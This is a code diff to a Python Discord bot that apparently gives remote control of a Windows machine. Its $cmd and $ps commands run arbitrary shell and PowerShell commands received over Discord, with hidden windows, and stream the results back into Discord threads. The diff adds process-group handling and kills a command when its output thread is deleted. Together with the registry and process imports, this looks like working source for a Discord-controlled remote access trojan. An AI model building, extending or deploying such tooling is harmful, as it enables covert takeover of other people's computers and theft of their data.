@@ -29,6 +29,7 @@ import base64
 import ctypes
 import psutil
 import shutil
+import signal
 import winreg
 import shlex
 import glob
@@ -561,6 +562,20 @@ async def macro(ctx, *, command: str = None):
         
     await ctx.send("No .pymacro file attached!")
 
+async def terminate_process(proc: subprocess.Popen, ctx):
+    try:
+        try:
+            proc.send_signal(signal.CTRL_BREAK_EVENT)
+        except Exception:
+            proc.terminate()
+        for _ in range(30):
+            if proc.poll() is not None:
+                return
+            await asyncio.sleep(0.05)
+        proc.kill()
+    except Exception as e:
+        await ctx.send(f"Error executing command: {e}")
+    
 @bot.command(help="Runs a command using subprocess and streams output live", usage="$cmd <command>")
 async def cmd(ctx, *, command: str = None):
     if not command or not command.strip():
@@ -568,20 +583,35 @@ async def cmd(ctx, *, command: str = None):
         return
 
     try:
-        process = subprocess.Popen(f'cmd /c "{command}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")
+        creation = 0
+        if hasattr(subprocess, "CREATE_NO_WINDOW"):
+            creation |= subprocess.CREATE_NO_WINDOW
+        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
+            creation |= subprocess.CREATE_NEW_PROCESS_GROUP
+
+        process = subprocess.Popen(
+            f'cmd /c "{command}"',
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+            creationflags=creation
+        )
 
         thread = None
+        watcher_task = None
+        thread_deleted = False
         first_output = None
         pending = []
         pending_len = 0
         MAX_MSG = 1900
         FLUSH_INTERVAL = 0.7
-
-        import time as _t
-        last_flush = _t.monotonic()
+        last_flush = time.monotonic()
 
         async def ensure_thread():
-            nonlocal thread, first_output
+            nonlocal thread, watcher_task
             if thread is None:
                 current_datetime = datetime.datetime.now().strftime("-%S")
                 base = (command or "")[:100 - len(current_datetime)]
@@ -593,24 +623,55 @@ async def cmd(ctx, *, command: str = None):
                     msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                 thread = await msg.create_thread(name=name)
 
+                async def watch_thread_delete():
+                    nonlocal thread_deleted
+                    try:
+                        await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
+                        thread_deleted = True
+                        await terminate_process(process, ctx)
+                    except Exception:
+                        pass
+
+                watcher_task = asyncio.create_task(watch_thread_delete())
+
+        async def try_send(to_send: str | None, *, as_file_name: str | None = None):
+            nonlocal thread_deleted
+            try:
+                await ensure_thread()
+                if thread_deleted:
+                    return False
+                if as_file_name:
+                    data = io.BytesIO(to_send.encode("utf-8"))
+                    await thread.send(file=discord.File(fp=data, filename=as_file_name))
+                else:
+                    await thread.send(to_send)
+                return True
+            except (discord.NotFound, discord.Forbidden):
+                thread_deleted = True
+                await terminate_process(process, ctx)
+                return False
+
         async def flush(force=False):
-            nonlocal pending, pending_len, last_flush
-            if not pending:
+            nonlocal pending, pending_len, last_flush, thread_deleted
+            if thread_deleted or not pending:
                 return
-            if not force and (_t.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
+            if not force and (time.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                 return
-            await ensure_thread()
             chunk = "\n".join(pending)
+            ok = True
             if len(chunk) > 2000:
-                data = io.BytesIO(chunk.encode("utf-8"))
-                await thread.send(file=discord.File(fp=data, filename="command_output.txt"))
+                ok = await try_send(chunk, as_file_name="command_output.txt")
             else:
-                await thread.send(chunk)
+                ok = await try_send(chunk)
             pending.clear()
             pending_len = 0
-            last_flush = _t.monotonic()
+            last_flush = time.monotonic()
+            if not ok:
+                return
 
         while True:
+            if thread_deleted:
+                break
             line = process.stdout.readline()
             if line == "" and process.poll() is not None:
                 break
@@ -628,22 +689,26 @@ async def cmd(ctx, *, command: str = None):
                 continue
 
             if len(s) > 2000:
-                await ensure_thread()
-                data = io.BytesIO(s.encode("utf-8"))
-                await thread.send(file=discord.File(fp=data, filename="line_output.txt"))
+                await try_send(s, as_file_name="line_output.txt")
+                if thread_deleted:
+                    break
                 continue
 
             pending.append(s)
             pending_len += len(s) + 1
             if pending_len >= MAX_MSG:
                 await flush(force=True)
-            elif (_t.monotonic() - last_flush) >= FLUSH_INTERVAL:
+            elif (time.monotonic() - last_flush) >= FLUSH_INTERVAL:
                 await flush()
 
-        if first_output and thread is None:
+        if not thread_deleted and first_output and thread is None:
             await ctx.send(f"**Output:**\n{first_output}")
 
-        await flush(force=True)
+        if not thread_deleted:
+            await flush(force=True)
+
+        if watcher_task:
+            watcher_task.cancel()
 
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
@@ -670,9 +735,12 @@ async def ps(ctx, *, command: str = None):
         si = subprocess.STARTUPINFO()
         si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         si.wShowWindow = 0
+
         creation = 0
         if hasattr(subprocess, "CREATE_NO_WINDOW"):
             creation |= subprocess.CREATE_NO_WINDOW
+        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
+            creation |= subprocess.CREATE_NEW_PROCESS_GROUP
 
         process = subprocess.Popen(
             ps_cmd,
@@ -687,17 +755,17 @@ async def ps(ctx, *, command: str = None):
         )
 
         thread = None
+        watcher_task = None
+        thread_deleted = False
         first_output = None
         pending = []
         pending_len = 0
         MAX_MSG = 1900
         FLUSH_INTERVAL = 0.7
-
-        import time as _t
-        last_flush = _t.monotonic()
+        last_flush = time.monotonic()
 
         async def ensure_thread():
-            nonlocal thread, first_output
+            nonlocal thread, watcher_task
             if thread is None:
                 current_datetime = datetime.datetime.now().strftime("-%S")
                 base = (command or "")[:100 - len(current_datetime)]
@@ -709,24 +777,55 @@ async def ps(ctx, *, command: str = None):
                     msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                 thread = await msg.create_thread(name=name)
 
+                async def watch_thread_delete():
+                    nonlocal thread_deleted
+                    try:
+                        await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
+                        thread_deleted = True
+                        await terminate_process(process, ctx)
+                    except Exception:
+                        pass
+
+                watcher_task = asyncio.create_task(watch_thread_delete())
+
+        async def try_send(to_send: str | None, *, as_file_name: str | None = None):
+            nonlocal thread_deleted
+            try:
+                await ensure_thread()
+                if thread_deleted:
+                    return False
+                if as_file_name:
+                    data = io.BytesIO(to_send.encode("utf-8"))
+                    await thread.send(file=discord.File(fp=data, filename=as_file_name))
+                else:
+                    await thread.send(to_send)
+                return True
+            except (discord.NotFound, discord.Forbidden):
+                thread_deleted = True
+                await terminate_process(process, ctx)
+                return False
+
         async def flush(force=False):
-            nonlocal pending, pending_len, last_flush
-            if not pending:
+            nonlocal pending, pending_len, last_flush, thread_deleted
+            if thread_deleted or not pending:
                 return
-            if not force and (_t.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
+            if not force and (time.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                 return
-            await ensure_thread()
             chunk = "\n".join(pending)
+            ok = True
             if len(chunk) > 2000:
-                data = io.BytesIO(chunk.encode("utf-8"))
-                await thread.send(file=discord.File(fp=data, filename="command_output.txt"))
+                ok = await try_send(chunk, as_file_name="command_output.txt")
             else:
-                await thread.send(chunk)
+                ok = await try_send(chunk)
             pending.clear()
             pending_len = 0
-            last_flush = _t.monotonic()
+            last_flush = time.monotonic()
+            if not ok:
+                return
 
         while True:
+            if thread_deleted:
+                break
             line = process.stdout.readline()
             if line == "" and process.poll() is not None:
                 break
@@ -744,22 +843,26 @@ async def ps(ctx, *, command: str = None):
                 continue
 
             if len(s) > 2000:
-                await ensure_thread()
-                data = io.BytesIO(s.encode("utf-8"))
-                await thread.send(file=discord.File(fp=data, filename="line_output.txt"))
+                await try_send(s, as_file_name="line_output.txt")
+                if thread_deleted:
+                    break
                 continue
 
             pending.append(s)
             pending_len += len(s) + 1
             if pending_len >= MAX_MSG:
                 await flush(force=True)
-            elif (_t.monotonic() - last_flush) >= FLUSH_INTERVAL:
+            elif (time.monotonic() - last_flush) >= FLUSH_INTERVAL:
                 await flush()
 
-        if first_output and thread is None:
+        if not thread_deleted and first_output and thread is None:
             await ctx.send(f"**Output:**\n{first_output}")
 
-        await flush(force=True)
+        if not thread_deleted:
+            await flush(force=True)
+
+        if watcher_task:
+            watcher_task.cancel()
 
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
